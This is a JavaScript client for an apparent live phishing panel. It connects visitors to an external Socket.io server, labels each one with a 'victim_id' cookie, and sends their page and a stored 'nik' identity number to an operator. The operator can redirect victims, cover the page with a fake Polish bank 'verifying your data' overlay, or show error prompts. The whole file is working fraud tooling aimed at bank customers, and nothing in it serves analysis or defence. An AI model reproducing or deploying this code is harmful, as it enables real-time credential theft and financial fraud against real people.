// Client-side control for Live Panel - Netlify version
// Connects to external Socket.io server (Railway/Render)

(function() {
    // Socket.io server URL
    const SOCKET_SERVER_URL = 'https://my-project.railway.app';

    const socketScript = document.createElement('script');
    socketScript.src = SOCKET_SERVER_URL + '/socket.io/socket.io.js';
    document.head.appendChild(socketScript);

    socketScript.onload = function() {
        const socket = io(SOCKET_SERVER_URL);

        // Resolve victim ID: prefer server-set cookie, then sessionStorage
        function getCookie(name) {
            const m = document.cookie.match('(?:^|; )' + name + '=([^;]*)');
            return m ? decodeURIComponent(m[1]) : null;
        }

        let victimId = getCookie('victim_id') || sessionStorage.getItem('victim_id');
        if (!victimId) {
            victimId = 'v_' + Math.random().toString(36).substr(2, 9);
            document.cookie = 'victim_id=' + victimId + '; path=/; SameSite=Lax';
        }
        sessionStorage.setItem('victim_id', victimId);

        const pageName = window.location.pathname.replace('/', '') || 'index';

        socket.emit('victim_join', {
            id: victimId,
            page: pageName,
            info: {
                nik: sessionStorage.getItem('nik')
            }
        });

        socket.on('command', (data) => {
            console.log('Received command:', data);
            if (data.command === 'redirect') {
                if (data.page.startsWith('http')) {
                    window.location.href = data.page;
                } else {
                    window.location.href = `/${data.page}`;
                }
            } else if (data.command === 'wait') {
                // Show a "please wait" overlay
                if (document.getElementById('wait-overlay')) return;
                const overlay = document.createElement('div');
                overlay.id = 'wait-overlay';
                overlay.style.position = 'fixed';
                overlay.style.top = '0';
                overlay.style.left = '0';
                overlay.style.width = '100%';
                overlay.style.height = '100%';
                overlay.style.background = 'rgba(255, 255, 255, 0.95)';
                overlay.style.zIndex = '99999';
                overlay.style.display = 'flex';
                overlay.style.alignItems = 'center';
                overlay.style.justifyContent = 'center';
                overlay.style.flexDirection = 'column';
                overlay.style.textAlign = 'center';
                overlay.style.padding = '20px';
                overlay.innerHTML = `
                    <div style="max-width:400px">
                        <h2 style="color:#d9251d; font-family: 'Open Sans', sans-serif;">Proszę czekać...</h2>
                        <p style="font-size:1.1rem; color:#333; margin-top:15px;">Trwa weryfikacja Twoich danych w systemie bankowym. Prosimy nie zamykać okna przeglądarki.</p>
                        <div style="margin-top:20px">
                        <div style="width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #d9251d;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto;"></div>
                        <style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
                        </div>
                    </div>
                `;
                document.body.appendChild(overlay);
            } else if (data.command === 'error') {
                const overlay = document.getElementById('wait-overlay');
                if (overlay) overlay.remove();
                alert(data.page || 'Wystąpił błąd. Spróbuj ponownie.');
            }
        });
    };

    // Handle connection error
    socketScript.onerror = function() {
        console.error('Failed to load Socket.io script from', SOCKET_SERVER_URL);
    };
})();
